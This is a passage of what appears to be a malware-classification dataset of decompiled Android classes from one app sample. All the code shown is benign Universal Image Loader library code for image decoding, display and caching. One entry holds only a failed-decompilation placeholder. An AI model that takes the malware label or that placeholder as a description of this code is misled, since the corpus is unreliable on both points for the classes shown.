decodingInfo) throws IOException {     return decodingInfo.getDownloader().getStream(decodingInfo.getImageUri(),decodingInfo.getExtraForDownloader());   }   protected ImageFileInfo defineImageSizeAndRotation(  InputStream imageStream,  ImageDecodingInfo decodingInfo) throws IOException {     ExifInfo exif;     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeStream(imageStream,null,options);     String imageUri=decodingInfo.getImageUri();     if (decodingInfo.shouldConsiderExifParams() && canDefineExifParams(imageUri,options.outMimeType)) {       exif=defineExifOrientation(imageUri);     }  else {       exif=new ExifInfo();     }     return new ImageFileInfo(new ImageSize(options.outWidth,options.outHeight,exif.rotation),exif);   }   private boolean canDefineExifParams(  String imageUri,  String mimeType){     return ""image/jpeg"".equalsIgnoreCase(mimeType) && ImageDownloader.Scheme.ofUri(imageUri) == ImageDownloader.Scheme.FILE;   }   protected ExifInfo defineExifOrientation(  String imageUri){     int rotation=0;     boolean flip=false;     try {       ExifInterface exif=new ExifInterface(ImageDownloader.Scheme.FILE.crop(imageUri));       int exifOrientation=exif.getAttributeInt(""Orientation"",1); switch (exifOrientation) { case 1:         rotation=0;       break; case 2:     flip=true;   rotation=0; break; case 3: rotation=180; break; case 4: flip=true; rotation=180; break; case 5: flip=true; rotation=270; break; case 6: rotation=90; break; case 7: flip=true; rotation=90; break; case 8: rotation=270; break; } }  catch (IOException e) { L.w(""Can't read EXIF tags from file [%s]"",imageUri); } return new ExifInfo(rotation,flip); } protected BitmapFactory.Options prepareDecodingOptions(ImageSize imageSize,ImageDecodingInfo decodingInfo){ int scale; ImageScaleType scaleType=decodingInfo.getImageScaleType(); if (scaleType == ImageScaleType.NONE) { scale=1; }  else if (scaleType == ImageScaleType.NONE_SAFE) { scale=ImageSizeUtils.computeMinImageSampleSize(imageSize); }  else { ImageSize targetSize=decodingInfo.getTargetSize(); boolean powerOf2=scaleType == ImageScaleType.IN_SAMPLE_POWER_OF_2; scale=ImageSizeUtils.computeImageSampleSize(imageSize,targetSize,decodingInfo.getViewScaleType(),powerOf2); } if (scale > 1 && this.loggingEnabled) { L.d(LOG_SUBSAMPLE_IMAGE,imageSize,imageSize.scaleDown(scale),Integer.valueOf(scale),decodingInfo.getImageKey()); } BitmapFactory.Options decodingOptions=decodingInfo.getDecodingOptions(); decodingOptions.inSampleSize=scale; return decodingOptions; } protected InputStream resetStream(InputStream imageStream,ImageDecodingInfo decodingInfo) throws IOException { try { imageStream.reset(); return imageStream; }  catch (IOException e) { IoUtils.closeSilently(imageStream); return getImageStream(decodingInfo); } } protected Bitmap considerExactScaleAndOrientatiton(Bitmap subsampledBitmap,ImageDecodingInfo decodingInfo,int rotation,boolean flipHorizontal){ Matrix m=new Matrix(); ImageScaleType scaleType=decodingInfo.getImageScaleType(); if (scaleType == ImageScaleType.EXACTLY || scaleType == ImageScaleType.EXACTLY_STRETCHED) { ImageSize srcSize=new ImageSize(subsampledBitmap.getWidth(),subsampledBitmap.getHeight(),rotation); float scale=ImageSizeUtils.computeImageScale(srcSize,decodingInfo.getTargetSize(),decodingInfo.getViewScaleType(),scaleType == ImageScaleType.EXACTLY_STRETCHED); if (Float.compare(scale,1.0f) != 0) { m.setScale(scale,scale); if (this.loggingEnabled) { L.d(LOG_SCALE_IMAGE,srcSize,srcSize.scale(scale),Float.valueOf(scale),decodingInfo.getImageKey()); } } } if (flipHorizontal) { m.postScale(-1.0f,1.0f); if (this.loggingEnabled) { L.d(LOG_FLIP_IMAGE,decodingInfo.getImageKey()); } } if (rotation != 0) { m.postRotate(rotation); if (this.loggingEnabled) { L.d(LOG_ROTATE_IMAGE,Integer.valueOf(rotation),decodingInfo.getImageKey()); } } Bitmap finalBitmap=Bitmap.createBitmap(subsampledBitmap,0,0,subsampledBitmap.getWidth(),subsampledBitmap.getHeight(),m,true); if (finalBitmap != subsampledBitmap) { subsampledBitmap.recycle(); } return finalBitmap; } public static class ExifInfo { public final boolean flipHorizontal; public final int rotation; protected ExifInfo(){ this.rotation=0; this.flipHorizontal=false; } protected ExifInfo(int rotation,boolean flipHorizontal){ this.rotation=rotation; this.flipHorizontal=flipHorizontal; } } public static class ImageFileInfo { public final ExifInfo exif; public final ImageSize imageSize; protected ImageFileInfo(ImageSize imageSize,ExifInfo exif){ this.imageSize=imageSize; this.exif=exif; } } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.decode\ExifInfo.code","public static class ExifInfo {   public final boolean flipHorizontal;   public final int rotation;   protected ExifInfo(){     this.rotation=0;     this.flipHorizontal=false;   }   protected ExifInfo(  int rotation,  boolean flipHorizontal){     this.rotation=rotation;     this.flipHorizontal=flipHorizontal;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.decode\ImageDecoder.code","public interface ImageDecoder {   Bitmap decode(  ImageDecodingInfo imageDecodingInfo) throws IOException ; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.decode\ImageDecodingInfo.code","public class ImageDecodingInfo {   private final boolean considerExifParams;   private final BitmapFactory.Options decodingOptions=new BitmapFactory.Options();   private final ImageDownloader downloader;   private final Object extraForDownloader;   private final String imageKey;   private final ImageScaleType imageScaleType;   private final String imageUri;   private final String originalImageUri;   private final ImageSize targetSize;   private final ViewScaleType viewScaleType;   public ImageDecodingInfo(  String imageKey,  String imageUri,  String originalImageUri,  ImageSize targetSize,  ViewScaleType viewScaleType,  ImageDownloader downloader,  DisplayImageOptions displayOptions){     this.imageKey=imageKey;     this.imageUri=imageUri;     this.originalImageUri=originalImageUri;     this.targetSize=targetSize;     this.imageScaleType=displayOptions.getImageScaleType();     this.viewScaleType=viewScaleType;     this.downloader=downloader;     this.extraForDownloader=displayOptions.getExtraForDownloader();     this.considerExifParams=displayOptions.isConsiderExifParams();     copyOptions(displayOptions.getDecodingOptions(),this.decodingOptions);   }   private void copyOptions(  BitmapFactory.Options srcOptions,  BitmapFactory.Options destOptions){     destOptions.inDensity=srcOptions.inDensity;     destOptions.inDither=srcOptions.inDither;     destOptions.inInputShareable=srcOptions.inInputShareable;     destOptions.inJustDecodeBounds=srcOptions.inJustDecodeBounds;     destOptions.inPreferredConfig=srcOptions.inPreferredConfig;     destOptions.inPurgeable=srcOptions.inPurgeable;     destOptions.inSampleSize=srcOptions.inSampleSize;     destOptions.inScaled=srcOptions.inScaled;     destOptions.inScreenDensity=srcOptions.inScreenDensity;     destOptions.inTargetDensity=srcOptions.inTargetDensity;     destOptions.inTempStorage=srcOptions.inTempStorage;     if (Build.VERSION.SDK_INT >= 10) {       copyOptions10(srcOptions,destOptions);     }     if (Build.VERSION.SDK_INT >= 11) {       copyOptions11(srcOptions,destOptions);     }   }   @TargetApi(10) private void copyOptions10(  BitmapFactory.Options srcOptions,  BitmapFactory.Options destOptions){     destOptions.inPreferQualityOverSpeed=srcOptions.inPreferQualityOverSpeed;   }   @TargetApi(11) private void copyOptions11(  BitmapFactory.Options srcOptions,  BitmapFactory.Options destOptions){     destOptions.inBitmap=srcOptions.inBitmap;     destOptions.inMutable=srcOptions.inMutable;   }   public String getImageKey(){     return this.imageKey;   }   public String getImageUri(){     return this.imageUri;   }   public String getOriginalImageUri(){     return this.originalImageUri;   }   public ImageSize getTargetSize(){     return this.targetSize;   }   public ImageScaleType getImageScaleType(){     return this.imageScaleType;   }   public ViewScaleType getViewScaleType(){     return this.viewScaleType;   }   public ImageDownloader getDownloader(){     return this.downloader;   }   public Object getExtraForDownloader(){     return this.extraForDownloader;   }   public boolean shouldConsiderExifParams(){     return this.considerExifParams;   }   public BitmapFactory.Options getDecodingOptions(){     return this.decodingOptions;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.decode\ImageFileInfo.code","public static class ImageFileInfo {   public final ExifInfo exif;   public final ImageSize imageSize;   protected ImageFileInfo(  ImageSize imageSize,  ExifInfo exif){     this.imageSize=imageSize;     this.exif=exif;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.display\BitmapDisplayer.code","public interface BitmapDisplayer {   void display(  Bitmap bitmap,  ImageAware imageAware,  LoadedFrom loadedFrom); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.display\FadeInBitmapDisplayer.code","public class FadeInBitmapDisplayer implements BitmapDisplayer {   private final boolean animateFromDisk;   private final boolean animateFromMemory;   private final boolean animateFromNetwork;   private final int durationMillis;   public FadeInBitmapDisplayer(  int durationMillis){     this(durationMillis,true,true,true);   }   public FadeInBitmapDisplayer(  int durationMillis,  boolean animateFromNetwork,  boolean animateFromDisk,  boolean animateFromMemory){     this.durationMillis=durationMillis;     this.animateFromNetwork=animateFromNetwork;     this.animateFromDisk=animateFromDisk;     this.animateFromMemory=animateFromMemory;   }   @Override public void display(  Bitmap bitmap,  ImageAware imageAware,  LoadedFrom loadedFrom){     imageAware.setImageBitmap(bitmap);     if ((this.animateFromNetwork && loadedFrom == LoadedFrom.NETWORK) || ((this.animateFromDisk && loadedFrom == LoadedFrom.DISC_CACHE) || (this.animateFromMemory && loadedFrom == LoadedFrom.MEMORY_CACHE))) {       animate(imageAware.getWrappedView(),this.durationMillis);     }   }   public static void animate(  View imageView,  int durationMillis){     if (imageView != null) {       AlphaAnimation fadeImage=new AlphaAnimation(0.0f,1.0f);       fadeImage.setDuration(durationMillis);       fadeImage.setInterpolator(new DecelerateInterpolator());       imageView.startAnimation(fadeImage);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.display\RoundedBitmapDisplayer.code","public class RoundedBitmapDisplayer implements BitmapDisplayer {   protected final int cornerRadius;   protected final int margin;   public RoundedBitmapDisplayer(  int cornerRadiusPixels){     this(cornerRadiusPixels,0);   }   public RoundedBitmapDisplayer(  int cornerRadiusPixels,  int marginPixels){     this.cornerRadius=cornerRadiusPixels;     this.margin=marginPixels;   }   @Override public void display(  Bitmap bitmap,  ImageAware imageAware,  LoadedFrom loadedFrom){     if (!(imageAware instanceof ImageViewAware)) {       throw new IllegalArgumentException(""ImageAware should wrap ImageView. ImageViewAware is expected."");     }     imageAware.setImageDrawable(new RoundedDrawable(bitmap,this.cornerRadius,this.margin));   } public static class RoundedDrawable extends Drawable {     protected final BitmapShader bitmapShader;     protected final float cornerRadius;     protected final RectF mBitmapRect;     protected final int margin;     protected final RectF mRect=new RectF();     protected final Paint paint=new Paint();     public RoundedDrawable(    Bitmap bitmap,    int cornerRadius,    int margin){       this.cornerRadius=cornerRadius;       this.margin=margin;       this.bitmapShader=new BitmapShader(bitmap,Shader.TileMode.CLAMP,Shader.TileMode.CLAMP);       this.mBitmapRect=new RectF(margin,margin,bitmap.getWidth() - margin,bitmap.getHeight() - margin);       this.paint.setAntiAlias(true);       this.paint.setShader(this.bitmapShader);     }     @Override public void onBoundsChange(    Rect bounds){       super.onBoundsChange(bounds);       this.mRect.set(this.margin,this.margin,bounds.width() - this.margin,bounds.height() - this.margin);       Matrix shaderMatrix=new Matrix();       shaderMatrix.setRectToRect(this.mBitmapRect,this.mRect,Matrix.ScaleToFit.FILL);       this.bitmapShader.setLocalMatrix(shaderMatrix);     }     @Override public void draw(    Canvas canvas){       canvas.drawRoundRect(this.mRect,this.cornerRadius,this.cornerRadius,this.paint);     }     @Override public int getOpacity(){       return -3;     }     @Override public void setAlpha(    int alpha){       this.paint.setAlpha(alpha);     }     @Override public void setColorFilter(    ColorFilter cf){       this.paint.setColorFilter(cf);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.display\RoundedDrawable.code","public static class RoundedDrawable extends Drawable {   protected final BitmapShader bitmapShader;   protected final float cornerRadius;   protected final RectF mBitmapRect;   protected final int margin;   protected final RectF mRect=new RectF();   protected final Paint paint=new Paint();   public RoundedDrawable(  Bitmap bitmap,  int cornerRadius,  int margin){     this.cornerRadius=cornerRadius;     this.margin=margin;     this.bitmapShader=new BitmapShader(bitmap,Shader.TileMode.CLAMP,Shader.TileMode.CLAMP);     this.mBitmapRect=new RectF(margin,margin,bitmap.getWidth() - margin,bitmap.getHeight() - margin);     this.paint.setAntiAlias(true);     this.paint.setShader(this.bitmapShader);   }   @Override public void onBoundsChange(  Rect bounds){     super.onBoundsChange(bounds);     this.mRect.set(this.margin,this.margin,bounds.width() - this.margin,bounds.height() - this.margin);     Matrix shaderMatrix=new Matrix();     shaderMatrix.setRectToRect(this.mBitmapRect,this.mRect,Matrix.ScaleToFit.FILL);     this.bitmapShader.setLocalMatrix(shaderMatrix);   }   @Override public void draw(  Canvas canvas){     canvas.drawRoundRect(this.mRect,this.cornerRadius,this.cornerRadius,this.paint);   }   @Override public int getOpacity(){     return -3;   }   @Override public void setAlpha(  int alpha){     this.paint.setAlpha(alpha);   }   @Override public void setColorFilter(  ColorFilter cf){     this.paint.setColorFilter(cf);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.display\RoundedVignetteBitmapDisplayer.code","public class RoundedVignetteBitmapDisplayer extends RoundedBitmapDisplayer {   public RoundedVignetteBitmapDisplayer(  int cornerRadiusPixels,  int marginPixels){     super(cornerRadiusPixels,marginPixels);   }   @Override public void display(  Bitmap bitmap,  ImageAware imageAware,  LoadedFrom loadedFrom){     if (!(imageAware instanceof ImageViewAware)) {       throw new IllegalArgumentException(""ImageAware should wrap ImageView. ImageViewAware is expected."");     }     imageAware.setImageDrawable(new RoundedVignetteDrawable(bitmap,this.cornerRadius,this.margin));   } protected static class RoundedVignetteDrawable extends RoundedBitmapDisplayer.RoundedDrawable {     RoundedVignetteDrawable(    Bitmap bitmap,    int cornerRadius,    int margin){       super(bitmap,cornerRadius,margin);     }     @Override public void onBoundsChange(    Rect bounds){       super.onBoundsChange(bounds);       RadialGradient vignette=new RadialGradient(this.mRect.centerX(),(this.mRect.centerY() * 1.0f) / 0.7f,this.mRect.centerX() * 1.3f,new int[]{0,0,2130706432},new float[]{0.0f,0.7f,1.0f},Shader.TileMode.CLAMP);       Matrix oval=new Matrix();       oval.setScale(1.0f,0.7f);       vignette.setLocalMatrix(oval);       this.paint.setShader(new ComposeShader(this.bitmapShader,vignette,PorterDuff.Mode.SRC_OVER));     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.display\RoundedVignetteDrawable.code","protected static class RoundedVignetteDrawable extends RoundedBitmapDisplayer.RoundedDrawable {   RoundedVignetteDrawable(  Bitmap bitmap,  int cornerRadius,  int margin){     super(bitmap,cornerRadius,margin);   }   @Override public void onBoundsChange(  Rect bounds){     super.onBoundsChange(bounds);     RadialGradient vignette=new RadialGradient(this.mRect.centerX(),(this.mRect.centerY() * 1.0f) / 0.7f,this.mRect.centerX() * 1.3f,new int[]{0,0,2130706432},new float[]{0.0f,0.7f,1.0f},Shader.TileMode.CLAMP);     Matrix oval=new Matrix();     oval.setScale(1.0f,0.7f);     vignette.setLocalMatrix(oval);     this.paint.setShader(new ComposeShader(this.bitmapShader,vignette,PorterDuff.Mode.SRC_OVER));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.display\SimpleBitmapDisplayer.code","public final class SimpleBitmapDisplayer implements BitmapDisplayer {   @Override public void display(  Bitmap bitmap,  ImageAware imageAware,  LoadedFrom loadedFrom){     imageAware.setImageBitmap(bitmap);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.download\BaseImageDownloader.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7a8f57c7"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.download\ImageDownloader.code","public interface ImageDownloader {   InputStream getStream(  String str,  Object obj) throws IOException ;   public enum Scheme {  HTTP(""http""),   HTTPS(""https""),   FILE(""file""),   CONTENT(""content""),   ASSETS(""assets""),   DRAWABLE(""drawable""),   UNKNOWN("""");   private String scheme;   private String uriPrefix;   Scheme(  String scheme){     this.scheme=scheme;     this.uriPrefix=scheme + ""://"";   }   public static Scheme ofUri(  String uri){     if (uri != null) {       Scheme[] arr$=values();       for (      Scheme s : arr$) {         if (s.belongsTo(uri)) {           return s;         }       }     }     return UNKNOWN;   }   private boolean belongsTo(  String uri){     return uri.toLowerCase(Locale.US).startsWith(this.uriPrefix);   }   public String wrap(  String path){     return this.uriPrefix + path;   }   public String crop(  String uri){     if (!belongsTo(uri)) {       throw new IllegalArgumentException(String.format(""URI [%1$s] doesn't have expected scheme [%2$s]"",uri,this.scheme));     }     return uri.substring(this.uriPrefix.length());   } } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.imageaware\ImageAware.code","public interface ImageAware {   int getHeight();   int getId();   ViewScaleType getScaleType();   int getWidth();   View getWrappedView();   boolean isCollected();   boolean setImageBitmap(  Bitmap bitmap);   boolean setImageDrawable(  Drawable drawable); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.imageaware\ImageViewAware.code","public class ImageViewAware extends ViewAware {   public ImageViewAware(  ImageView imageView){     super(imageView);   }   public ImageViewAware(  ImageView imageView,  boolean checkActualViewSize){     super(imageView,checkActualViewSize);   }   @Override public int getWidth(){     ImageView imageView;     int width=super.getWidth();     if (width <= 0 && (imageView=(ImageView)this.viewRef.get()) != null) {       return getImageViewFieldValue(imageView,""mMaxWidth"");     }     return width;   }   @Override public int getHeight(){     ImageView imageView;     int height=super.getHeight();     if (height <= 0 && (imageView=(ImageView)this.viewRef.get()) != null) {       return getImageViewFieldValue(imageView,""mMaxHeight"");     }     return height;   }   @Override public ViewScaleType getScaleType(){     ImageView imageView=(ImageView)this.viewRef.get();     return imageView != null ? ViewScaleType.fromImageView(imageView) : super.getScaleType();   }   @Override public ImageView getWrappedView(){     return (ImageView)super.getWrappedView();   }   @Override protected void setImageDrawableInto(  Drawable drawable,  View view){     ((ImageView)view).setImageDrawable(drawable);     if (drawable instanceof AnimationDrawable) {       ((AnimationDrawable)drawable).start();     }   }   @Override protected void setImageBitmapInto(  Bitmap bitmap,  View view){     ((ImageView)view).setImageBitmap(bitmap);   }   private static int getImageViewFieldValue(  Object object,  String fieldName){     try {       Field field=ImageView.class.getDeclaredField(fieldName);       field.setAccessible(true);       int fieldValue=((Integer)field.get(object)).intValue();       if (fieldValue <= 0 || fieldValue >= Integer.MAX_VALUE) {         return 0;       }       return fieldValue;     }  catch (    Exception e) {       L.e(e);       return 0;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.imageaware\NonViewAware.code","public class NonViewAware implements ImageAware {   protected final ImageSize imageSize;   protected final String imageUri;   protected final ViewScaleType scaleType;   public NonViewAware(  ImageSize imageSize,  ViewScaleType scaleType){     this(null,imageSize,scaleType);   }   public NonViewAware(  String imageUri,  ImageSize imageSize,  ViewScaleType scaleType){     if (imageSize == null) {       throw new IllegalArgumentException(""imageSize must not be null"");     }     if (scaleType == null) {       throw new IllegalArgumentException(""scaleType must not be null"");     }     this.imageUri=imageUri;     this.imageSize=imageSize;     this.scaleType=scaleType;   }   @Override public int getWidth(){     return this.imageSize.getWidth();   }   @Override public int getHeight(){     return this.imageSize.getHeight();   }   @Override public ViewScaleType getScaleType(){     return this.scaleType;   }   @Override public View getWrappedView(){     return null;   }   @Override public boolean isCollected(){     return false;   }   @Override public int getId(){     return TextUtils.isEmpty(this.imageUri) ? super.hashCode() : this.imageUri.hashCode();   }   @Override public boolean setImageDrawable(  Drawable drawable){     return true;   }   @Override public boolean setImageBitmap(  Bitmap bitmap){     return true;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.imageaware\ViewAware.code","public abstract class ViewAware implements ImageAware {   public static final String WARN_CANT_SET_BITMAP=""Can't set a bitmap into view. You should call ImageLoader on UI thread for it."";   public static final String WARN_CANT_SET_DRAWABLE=""Can't set a drawable into view. You should call ImageLoader on UI thread for it."";   protected boolean checkActualViewSize;   protected Reference<View> viewRef;   protected abstract void setImageBitmapInto(  Bitmap bitmap,  View view);   protected abstract void setImageDrawableInto(  Drawable drawable,  View view);   public ViewAware(  View view){     this(view,true);   }   public ViewAware(  View view,  boolean checkActualViewSize){     if (view == null) {       throw new IllegalArgumentException(""view must not be null"");     }     this.viewRef=new WeakReference(view);     this.checkActualViewSize=checkActualViewSize;   }   @Override public int getWidth(){     View view=this.viewRef.get();     if (view == null) {       return 0;     }     ViewGroup.LayoutParams params=view.getLayoutParams();     int width=0;     if (this.checkActualViewSize && params != null && params.width != -2) {       width=view.getWidth();     }     return (width > 0 || params == null) ? width : params.width;   }   @Override public int getHeight(){     View view=this.viewRef.get();     if (view == null) {       return 0;     }     ViewGroup.LayoutParams params=view.getLayoutParams();     int height=0;     if (this.checkActualViewSize && params != null && params.height != -2) {       height=view.getHeight();     }     return (height > 0 || params == null) ? height : params.height;   }   @Override public ViewScaleType getScaleType(){     return ViewScaleType.CROP;   }   @Override public View getWrappedView(){     return this.viewRef.get();   }   @Override public boolean isCollected(){     return this.viewRef.get() == null;   }   @Override public int getId(){     View view=this.viewRef.get();     return view == null ? super.hashCode() : view.hashCode();   }   @Override public boolean setImageDrawable(  Drawable drawable){     if (Looper.myLooper() == Looper.getMainLooper()) {       View view=this.viewRef.get();       if (view == null) {         return false;       }       setImageDrawableInto(drawable,view);       return true;     }     L.w(WARN_CANT_SET_DRAWABLE,new Object[0]);     return false;   }   @Override public boolean setImageBitmap(  Bitmap bitmap){     if (Looper.myLooper() == Looper.getMainLooper()) {       View view=this.viewRef.get();       if (view == null) {         return false;       }       setImageBitmapInto(bitmap,view);       return true;     }     L.w(WARN_CANT_SET_BITMAP,new Object[0]);     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.listener\ImageLoadingListener.code","public interface ImageLoadingListener {   void onLoadingCancelled(  String str,  View view);   void onLoadingComplete(  String str,  View view,  Bitmap bitmap);   void onLoadingFailed(  String str,  View view,  FailReason failReason);   void onLoadingStarted(  String str,  View view); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.listener\ImageLoadingProgressListener.code","public interface ImageLoadingProgressListener {   void onProgressUpdate(  String str,  View view,  int i,  int i2); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.listener\PauseOnScrollListener.code","public class PauseOnScrollListener implements AbsListView.OnScrollListener {   private final AbsListView.OnScrollListener externalListener;   private ImageLoader imageLoader;   private final boolean pauseOnFling;   private final boolean pauseOnScroll;   public PauseOnScrollListener(  ImageLoader imageLoader,  boolean pauseOnScroll,  boolean pauseOnFling){     this(imageLoader,pauseOnScroll,pauseOnFling,null);   }   public PauseOnScrollListener(  ImageLoader imageLoader,  boolean pauseOnScroll,  boolean pauseOnFling,  AbsListView.OnScrollListener customListener){     this.imageLoader=imageLoader;     this.pauseOnScroll=pauseOnScroll;     this.pauseOnFling=pauseOnFling;     this.externalListener=customListener;   }   @Override public void onScrollStateChanged(  AbsListView view,  int scrollState){ switch (scrollState) { case 0:       this.imageLoader.resume();     break; case 1:   if (this.pauseOnScroll) {     this.imageLoader.pause();     break;   } break; case 2: if (this.pauseOnFling) { this.imageLoader.pause(); break; } break; } if (this.externalListener != null) { this.externalListener.onScrollStateChanged(view,scrollState); } } @Override public void onScroll(AbsListView view,int firstVisibleItem,int visibleItemCount,int totalItemCount){ if (this.externalListener != null) { this.externalListener.onScroll(view,firstVisibleItem,visibleItemCount,totalItemCount); } } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.listener\SimpleImageLoadingListener.code","public class SimpleImageLoadingListener implements ImageLoadingListener {   @Override public void onLoadingStarted(  String imageUri,  View view){   }   @Override public void onLoadingFailed(  String imageUri,  View view,  FailReason failReason){   }   @Override public void onLoadingComplete(  String imageUri,  View view,  Bitmap loadedImage){   }   @Override public void onLoadingCancelled(  String imageUri,  View view){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.process\BitmapProcessor.code","public interface BitmapProcessor {   Bitmap process(  Bitmap bitmap); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.utils\CopyListener.code","public interface CopyListener {   boolean onBytesCopied(  int i,  int i2); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.utils\DiskCacheUtils.code","public final class DiskCacheUtils {   private DiskCacheUtils(){   }   public static File findInCache(  String imageUri,  DiskCache diskCache){     File image=diskCache.get(imageUri);     if (image == null || !image.exists()) {       return null;     }     return image;   }   public static boolean removeFromCache(  String imageUri,  DiskCache diskCache){     File image=diskCache.get(imageUri);     return image != null && image.exists() && image.delete();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.utils\ImageSizeUtils.code","public final class ImageSizeUtils {   private static final int DEFAULT_MAX_BITMAP_DIMENSION=2048;   private static ImageSize maxBitmapSize; static {     int[] maxTextureSize=new int[1];     GLES10.glGetIntegerv(3379,maxTextureSize,0);     int maxBitmapDimension=Math.max(maxTextureSize[0],2048);     maxBitmapSize=new ImageSize(maxBitmapDimension,maxBitmapDimension);   }   private ImageSizeUtils(){   }   public static ImageSize defineTargetSizeForView(  ImageAware imageAware,  ImageSize maxImageSize){     int width=imageAware.getWidth();     if (width <= 0) {       width=maxImageSize.getWidth();     }     int height=imageAware.getHeight();     if (height <= 0) {       height=maxImageSize.getHeight();     }     return new ImageSize(width,height);   }   public static int computeImageSampleSize(  ImageSize srcSize,  ImageSize targetSize,  ViewScaleType viewScaleType,  boolean powerOf2Scale){     int srcWidth=srcSize.getWidth();     int srcHeight=srcSize.getHeight();     int targetWidth=targetSize.getWidth();     int targetHeight=targetSize.getHeight();     int scale=1; switch (viewScaleType) { case FIT_INSIDE:       if (powerOf2Scale) {         int halfWidth=srcWidth / 2;         int halfHeight=srcHeight / 2;         while (true) {           if (halfWidth / scale <= targetWidth && halfHeight / scale <= targetHeight) {             break;           }  else {             scale*=2;           }         }       }  else {         scale=Math.max(srcWidth / targetWidth,srcHeight / targetHeight);         break;       }     break; case CROP:   if (powerOf2Scale) {     int halfWidth2=srcWidth / 2;     int halfHeight2=srcHeight / 2;     while (halfWidth2 / scale > targetWidth && halfHeight2 / scale > targetHeight) {       scale*=2;     }   }  else {     scale=Math.min(srcWidth / targetWidth,srcHeight / targetHeight);     break;   } } if (scale < 1) { scale=1; } return considerMaxTextureSize(srcWidth,srcHeight,scale,powerOf2Scale); } private static int considerMaxTextureSize(int srcWidth,int srcHeight,int scale,boolean powerOf2){ int maxWidth=maxBitmapSize.getWidth(); int maxHeight=maxBitmapSize.getHeight(); while (true) { if (srcWidth / scale > maxWidth || srcHeight / scale > maxHeight) {   if (powerOf2) {     scale*=2;   }  else {     scale++;   } }  else {   return scale; } } } public static int computeMinImageSampleSize(ImageSize srcSize){ int srcWidth=srcSize.getWidth(); int srcHeight=srcSize.getHeight(); int targetWidth=maxBitmapSize.getWidth(); int targetHeight=maxBitmapSize.getHeight(); int widthScale=(int)Math.ceil(srcWidth / targetWidth); int heightScale=(int)Math.ceil(srcHeight / targetHeight); return Math.max(widthScale,heightScale); } public static float computeImageScale(ImageSize srcSize,ImageSize targetSize,ViewScaleType viewScaleType,boolean stretch){ int destWidth; int destHeight; int srcWidth=srcSize.getWidth(); int srcHeight=srcSize.getHeight(); int targetWidth=targetSize.getWidth(); int targetHeight=targetSize.getHeight(); float widthScale=srcWidth / targetWidth; float heightScale=srcHeight / targetHeight; if ((viewScaleType == ViewScaleType.FIT_INSIDE && widthScale >= heightScale) || (viewScaleType == ViewScaleType.CROP && widthScale < heightScale)) { destWidth=targetWidth; destHeight=(int)(srcHeight / widthScale); }  else { destWidth=(int)(srcWidth / heightScale); destHeight=targetHeight; } if ((stretch || destWidth >= srcWidth || destHeight >= srcHeight) && (!stretch 